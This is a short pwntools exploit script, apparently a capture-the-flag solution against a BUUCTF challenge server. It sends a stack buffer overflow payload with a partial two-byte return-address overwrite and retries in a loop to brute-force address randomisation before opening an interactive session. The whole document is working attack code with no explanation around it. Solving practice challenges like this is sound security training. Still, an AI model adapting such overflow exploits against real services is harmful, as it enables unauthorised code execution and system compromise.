from pwn import *
context(os='linux', arch='amd64', log_level='debug')
 
while(1):
	try:
		#p = process('./111')
		p = remote('node4.buuoj.cn',28968)
		elf = ELF('./111')
 		
		payload =b'A'*(0X20 +8) +p16(0x126c)
		
		p.sendline(payload)
		p.interactive()
	except:
	    	p.close()